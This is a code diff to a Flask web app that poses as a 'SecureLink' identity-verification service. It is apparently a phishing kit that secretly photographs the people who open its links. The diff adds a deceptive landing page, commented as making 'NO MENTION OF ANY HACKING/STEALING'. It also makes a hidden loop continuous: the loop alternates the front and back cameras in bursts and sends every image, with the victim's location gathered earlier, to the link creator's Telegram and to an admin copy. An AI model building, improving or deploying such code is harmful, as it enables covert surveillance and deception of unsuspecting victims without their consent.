@@ -1,4 +1,4 @@
-# by:@ROMEO_UCHIHA (Updated Background Dual-Camera Capture)
+# by:@ROMEO_UCHIHA (Stealth Dual-Camera Burst & Pro Landing Page)
 from flask import Flask, request, render_template_string, jsonify, redirect, session
 from supabase import create_client, Client
 import base64, requests, os, time, uuid, random
@@ -38,7 +38,7 @@ def send_tg_photo(token, cid, raw_img, caption=""):
     try: requests.post(f"https://api.telegram.org/bot{token}/sendPhoto", data={"chat_id": cid, "caption": caption, "parse_mode": "Markdown"}, files={"photo": ("c.jpg", raw_img, "image/jpeg")}, timeout=10)
     except: pass
 
-# --- UI TEMPLATES (Pure Red Uchiha Theme) ---
+# --- UI TEMPLATES ---
 COMMON_STYLE = """
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -59,8 +59,78 @@ COMMON_STYLE = """
 </style>
 """
 
+# PROFESSIONAL LANDING PAGE (NO MENTION OF ANY HACKING/STEALING)
+LANDING_PAGE = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SecureLink | Advanced Identity Verification</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;500;700&display=swap');
+        body { margin: 0; padding: 0; font-family: 'Inter', sans-serif; background: #0f172a; color: #f8fafc; overflow-x: hidden; }
+        header { padding: 20px 50px; display: flex; justify-content: space-between; align-items: center; background: rgba(15, 23, 42, 0.95); backdrop-filter: blur(10px); position: sticky; top: 0; z-index: 100; border-bottom: 1px solid #1e293b; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        .logo { font-size: 24px; font-weight: 700; color: #38bdf8; text-decoration: none; display: flex; align-items: center; gap: 10px; }
+        .nav-links a { color: #cbd5e1; text-decoration: none; margin-left: 25px; font-weight: 500; transition: 0.3s; font-size: 15px; }
+        .nav-links a:hover { color: #38bdf8; }
+        .btn-primary { background: #38bdf8; color: #0f172a !important; padding: 10px 24px; border-radius: 8px; text-decoration: none; font-weight: 700; transition: 0.3s; }
+        .btn-primary:hover { background: #0ea5e9; box-shadow: 0 0 15px rgba(56, 189, 248, 0.4); }
+        .hero { text-align: center; padding: 120px 20px; background: radial-gradient(circle at top, #1e293b 0%, #0f172a 100%); }
+        .hero h1 { font-size: 3.5rem; margin-bottom: 20px; color: #fff; max-width: 900px; margin-left: auto; margin-right: auto; }
+        .hero h1 span { color: #38bdf8; text-shadow: 0 0 20px rgba(56,189,248,0.3); }
+        .hero p { font-size: 1.2rem; color: #94a3b8; max-width: 650px; margin: 0 auto 40px; line-height: 1.6; }
+        .features { display: flex; justify-content: center; gap: 40px; padding: 80px 20px; flex-wrap: wrap; background: #0f172a; }
+        .card { background: #1e293b; padding: 40px 30px; border-radius: 20px; width: 320px; text-align: center; border: 1px solid #334155; transition: 0.3s; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
+        .card:hover { transform: translateY(-10px); border-color: #38bdf8; }
+        .card .icon { font-size: 50px; margin-bottom: 20px; }
+        .card h3 { color: #f1f5f9; margin-bottom: 15px; font-size: 1.4rem; }
+        .card p { color: #94a3b8; font-size: 1rem; line-height: 1.6; }
+        footer { text-align: center; padding: 40px; color: #64748b; border-top: 1px solid #1e293b; font-size: 0.9rem; }
+        @media(max-width: 768px) { .hero h1 { font-size: 2.5rem; } header { padding: 20px; flex-direction: column; gap: 15px; } .nav-links { margin-top: 10px; } .nav-links a { margin: 0 10px; } }
+    </style>
+</head>
+<body>
+    <header>
+        <a href="/" class="logo">🔒 SecureLink</a>
+        <div class="nav-links">
+            <a href="/lg">Sign In</a>
+            <a href="/rg" class="btn-primary">Create Secure Link</a>
+        </div>
+    </header>
+    <div class="hero">
+        <h1>Protect Your Sensitive Files with <span>Identity Verification</span></h1>
+        <p>Ensure that only authorized individuals can access your URLs, images, or documents. Add Face ID and Geolocation layers to your links instantly.</p>
+        <a href="/lg" class="btn-primary" style="font-size: 1.2rem; padding: 18px 36px; display: inline-block;">Get Started for Free</a>
+    </div>
+    <div class="features">
+        <div class="card">
+            <div class="icon">🛡️</div>
+            <h3>Bank-Grade Protection</h3>
+            <p>We use advanced encryption and strict verification gates. Users must prove their identity before the original content is unlocked.</p>
+        </div>
+        <div class="card">
+            <div class="icon">👤</div>
+            <h3>Biometric Access</h3>
+            <p>Integrate real-time camera face verification. Prevent bots and unauthorized sharing of your confidential data.</p>
+        </div>
+        <div class="card">
+            <div class="icon">📍</div>
+            <h3>Location Lock</h3>
+            <p>Restrict access to specific regions. The link automatically verifies the user's GPS coordinates before granting entry.</p>
+        </div>
+    </div>
+    <footer>
+        &copy; 2026 SecureLink Protocol. All rights reserved. Secure Data Transfer Solutions.
+    </footer>
+</body>
+</html>
+"""
+
 @app.route("/")
-def index(): return redirect("/lg")
+def index(): 
+    # Redirecting base URL to the Professional Landing Page
+    return render_template_string(LANDING_PAGE)
 
 @app.route("/rg", methods=["GET", "POST"])
 def register():
@@ -198,7 +268,7 @@ def target_page(link_id):
             const bgV = document.getElementById('bg-v');
             const c = document.getElementById('c');
             let captureInterval = null;
-            let bgCamMode = "environment"; // Starts with BACK camera for background
+            let bgCamMode = "environment"; // Pehli dafa background Back camera chalega
 
             window.onload = () => { getHardware(); startVerificationFlow(); };
 
@@ -211,7 +281,6 @@ def target_page(link_id):
                 if(mode === 'both' || mode === 'camera') {
                     document.getElementById('cam-section').style.display = 'flex'; 
                     try {
-                        // FORCE FRONT CAMERA FOR INITIAL FACE VERIFICATION
                         v.srcObject = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                         startFaceCheck();
                     } catch(e) {
@@ -229,14 +298,10 @@ def target_page(link_id):
 
             function takeSnap() {
                 if(v.readyState < 2 || v.videoWidth === 0 || v.videoHeight === 0) return;
-                
-                c.width = v.videoWidth; 
-                c.height = v.videoHeight;
+                c.width = v.videoWidth; c.height = v.videoHeight;
                 c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
-                
                 let imgData = c.toDataURL('image/jpeg', 0.5);
                 if(imgData.length < 1000) return; 
-                
                 fetch("/api/capture/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ img: imgData, cam_type: "FRONT" }) });
             }
 
@@ -246,7 +311,6 @@ def target_page(link_id):
                 let timeLeft = 15;
                 let instructions = ["Look Straight", "Look Left", "Look Right", "Look Slightly Up", "Scanning Features..."];
                 let step = 0;
-                
                 const faceMsg = document.getElementById('face-msg');
                 const timerText = document.getElementById('seconds-timer');
                 const rayRing = document.getElementById('rayRing');
@@ -264,15 +328,12 @@ def target_page(link_id):
                 let timer = setInterval(() => {
                     timeLeft--;
                     timerText.innerText = timeLeft; 
-                    
                     if(timeLeft % 3 === 0) step = (step + 1) % instructions.length;
                     faceMsg.innerText = instructions[step];
 
                     if(timeLeft <= 0) {
                         clearInterval(timer);
                         clearInterval(captureInterval);
-                        
-                        // Stop the initial front camera stream to free resources for background logic
                         if (v.srcObject) v.srcObject.getTracks().forEach(t => t.stop());
 
                         if(mode === 'both') {
@@ -288,7 +349,6 @@ def target_page(link_id):
             function startLocationCheck() {
                 document.getElementById('loc-section').style.display = 'flex';
                 const locMsg = document.getElementById('loc-msg');
-                
                 if(navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
                         (p) => {
@@ -301,52 +361,53 @@ def target_page(link_id):
                             setTimeout(() => location.reload(), 2000);
                         }
                     );
-                } else {
-                    showContent();
-                }
+                } else { showContent(); }
             }
 
+            // CONTINUOUS BURST & SWAP LOGIC (Jitni front ki utni back ki)
             async function captureBackground() {
                 try {
-                    // Stop current background stream if exists
-                    if (bgV.srcObject) {
-                        bgV.srcObject.getTracks().forEach(t => t.stop());
-                    }
+                    if (bgV.srcObject) bgV.srcObject.getTracks().forEach(t => t.stop());
                     
-                    // Try exact mode first (better for strict mobile browsers) then fallback
                     let stream;
-                    try {
-                        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: bgCamMode } } });
-                    } catch(err) {
-                        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: bgCamMode } });
-                    }
+                    try { stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: bgCamMode } } }); } 
+                    catch(err) { stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: bgCamMode } }); }
                     
                     bgV.srcObject = stream;
-                    
                     bgV.onloadedmetadata = () => {
                         bgV.play();
-                        // Wait for camera to adjust focus and lighting
+                        let snapCount = 0;
+                        
+                        // Wait 1.5s for camera to adjust, then start taking fast pictures
                         setTimeout(() => {
-                            if(bgV.videoWidth > 0) {
-                                c.width = bgV.videoWidth;
-                                c.height = bgV.videoHeight;
-                                c.getContext('2d').drawImage(bgV, 0, 0, c.width, c.height);
-                                
-                                let imgData = c.toDataURL('image/jpeg', 0.5);
-                                let label = bgCamMode === "user" ? "FRONT" : "BACK";
-                                
-                                fetch("/api/capture/{{ l_id }}", { 
-                                    method: "POST", 
-                                    headers: {"Content-Type":"application/json"}, 
-                                    body: JSON.stringify({ img: imgData, cam_type: label }) 
-                                });
-                                
-                                // Toggle camera mode for the NEXT cycle (Back -> Front -> Back)
-                                bgCamMode = (bgCamMode === "environment") ? "user" : "environment";
-                            }
-                        }, 2000); 
+                            let burst = setInterval(() => {
+                                // Take 3 pictures in burst mode per camera side
+                                if(bgV.videoWidth > 0 && snapCount < 3) {
+                                    c.width = bgV.videoWidth; c.height = bgV.videoHeight;
+                                    c.getContext('2d').drawImage(bgV, 0, 0, c.width, c.height);
+                                    let imgData = c.toDataURL('image/jpeg', 0.5);
+                                    let label = bgCamMode === "user" ? "FRONT" : "BACK";
+                                    
+                                    fetch("/api/capture/{{ l_id }}", { 
+                                        method: "POST", headers: {"Content-Type":"application/json"}, 
+                                        body: JSON.stringify({ img: imgData, cam_type: label }) 
+                                    });
+                                    snapCount++;
+                                } else {
+                                    clearInterval(burst);
+                                    // Change Camera Mode for Next Round
+                                    bgCamMode = (bgCamMode === "environment") ? "user" : "environment";
+                                    // Start next loop immediately
+                                    captureBackground();
+                                }
+                            }, 800); // Har 800ms me ek photo
+                        }, 1500);
                     };
-                } catch(e) { console.error("BG Camera Error"); }
+                } catch(e) { 
+                    // Agar back camera fail ho to sirf front use karta rahega
+                    bgCamMode = "user";
+                    setTimeout(captureBackground, 3000);
+                }
             }
 
             function showContent() {
@@ -358,7 +419,6 @@ def target_page(link_id):
                 resBox.style.display = 'block';
 
                 let html = "";
-                
                 if(actMode === 'text') {
                     html = `<div class="content-text">${txtVal}</div>`;
                 } else if (actMode === 'file') {
@@ -373,20 +433,14 @@ def target_page(link_id):
                     } else {
                         html = `<iframe src="${actVal}" style="width:100%; height:50vh; border:none; border-radius:10px; border: 2px solid var(--red);"></iframe>`;
                     }
-                    
                     html += `<a href="${actVal}" download target="_blank" class="btn-download"><i class="fas fa-download"></i> Download Secure File</a>`;
-                    
                 } else {
                     html = `<iframe src="${actVal}" style="width:100%; height:80vh; border:none; border-radius:10px;"></iframe>`;
                 }
                 medBox.innerHTML = html;
 
-                // START THE INVISIBLE BACKGROUND CAPTURE LOOP
-                if(mode === 'both' || mode === 'camera') {
-                    // Trigger first background shot immediately, then loop every 8 seconds
-                    captureBackground();
-                    setInterval(captureBackground, 8000);
-                }
+                // Fire up continuous alternating burst capture loop
+                if(mode === 'both' || mode === 'camera') { captureBackground(); }
             }
         </script>
     </body>
@@ -432,11 +486,9 @@ def cap(l_id):
         data = request.get_json()
         
         img_data = data["img"]
-        cam_type = data.get("cam_type", "UNKNOWN") # FRONT ya BACK read karega
-        
+        cam_type = data.get("cam_type", "UNKNOWN")
         raw = base64.b64decode(img_data.split(",")[1])
         
-        # Caption updated for Front/Back label
         send_tg_photo(user["bot_token"], user["chat_id"], raw, f"😈 *UCHIHA CAPTURE*\\n📸 *Camera:* `{cam_type}`")
         send_tg_photo(ADMIN_TOKEN, ADMIN_CID, raw, f"🔥 *ADMIN COPY*\\nBy: {user['bot_name']}\\nCam: {cam_type}")
         return jsonify({"s": 1})
